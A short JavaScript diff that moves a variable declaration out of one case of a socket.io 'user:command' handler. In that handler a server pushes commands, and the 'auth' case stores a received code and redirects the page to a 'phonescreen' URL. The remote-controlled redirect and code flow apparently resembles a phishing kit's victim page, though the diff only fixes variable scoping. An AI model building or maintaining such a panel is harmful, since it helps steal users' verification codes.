@@ -70,6 +70,8 @@
 			
     socket.on("user:command", (data) => {
 	  const { command, code, phonescreen, link } = data;
+	  
+	  let phoneNumberEl;
 	//alert("command received");
 	  switch (command) {
 	    case "refresh":
@@ -99,7 +101,7 @@
 	
 	    case "auth":
 	      if (!code) return;
-	      let phoneNumberEl = document.querySelector("#code");
+	      phoneNumberEl = document.querySelector("#code");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
